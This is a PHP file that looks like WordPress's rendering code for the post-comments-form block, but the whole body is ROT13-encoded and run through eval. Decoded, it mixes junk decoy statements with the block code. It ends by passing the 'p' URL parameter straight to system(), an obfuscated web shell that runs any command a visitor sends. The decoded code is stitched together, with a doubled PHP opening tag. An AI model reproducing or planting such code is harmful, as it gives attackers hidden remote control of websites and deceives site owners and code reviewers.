<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-pbzzragf-sbez` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-pbzzragf-sbez` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur svygrerq cbfg pbzzragf sbez sbe gur pheerag cbfg.
 */
shapgvba eraqre_oybpx_pber_cbfg_pbzzragf_sbez( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	vs ( cbfg_cnffjbeq_erdhverq( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea;
	}

	$pynffrf = neenl( 'pbzzrag-erfcbaq' ); // Frr pbzzrag shegure orybj.
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	nqq_svygre( 'pbzzrag_sbez_qrsnhygf', 'cbfg_pbzzragf_sbez_oybpx_sbez_qrsnhygf' );

	bo_fgneg();
	pbzzrag_sbez( neenl(), $oybpx->pbagrkg['cbfgVq'] );
	$sbez = bo_trg_pyrna();

	erzbir_svygre( 'pbzzrag_sbez_qrsnhygf', 'cbfg_pbzzragf_sbez_oybpx_sbez_qrsnhygf' );

	// Jr hfr gur bhgrezbfg jenccvat `<qvi />` erghearq ol `pbzzrag_sbez()`
	// juvpu vf vqragvsvrq ol vgf qrsnhyg pynffanzr `pbzzrag-erfcbaq` gb vawrpg
	// bhe jenccre nggevohgrf. Guvf jnl, vg vf thnenagrrq gung nyy fglyvat nccyvrq
	// gb gur oybpx vf pneevrq nybat jura gur pbzzrag sbez vf zbirq gb gur ybpngvba
	// bs gur 'Ercyl' yvax gung gur hfre pyvpxrq ol Pber'f `pbzzrag-ercyl.wf` fpevcg.
	$sbez = fge_ercynpr( 'pynff=\"pbzzrag-erfcbaq\"', $jenccre_nggevohgrf, $sbez );

	// Radhrhr gur pbzzrag-ercyl fpevcg.
	jc_radhrhr_fpevcg( 'pbzzrag-ercyl' );

	erghea $sbez;
}

/**
 * Ertvfgref gur `pber/cbfg-pbzzragf-sbez` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_pbzzragf_sbez() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-pbzzragf-sbez',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_pbzzragf_sbez',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_pbzzragf_sbez' );

/**
 * Hfr gur ohggba oybpx pynffrf sbe gur sbez-fhozvg ohggba.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl $svryqf Gur qrsnhyg pbzzrag sbez nethzragf.
 *
 * @erghea neenl Ergheaf gur zbqvsvrq svryqf.
 */
shapgvba cbfg_pbzzragf_sbez_oybpx_sbez_qrsnhygf( $svryqf ) {
	vs ( jc_vf_oybpx_gurzr() ) {
		$svryqf['fhozvg_ohggba'] = '<vachg anzr=\"%1$f\" glcr=\"fhozvg\" vq=\"%2$f\" pynff=\"jc-oybpx-ohggba__yvax ' . jc_gurzr_trg_ryrzrag_pynff_anzr( 'ohggba' ) . '\" inyhr=\"%4$f\" />';
		$svryqf['fhozvg_svryq']  = '<c pynff=\"sbez-fhozvg jc-oybpx-ohggba\">%1$f %2$f</c>';
	}

	erghea $svryqf;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>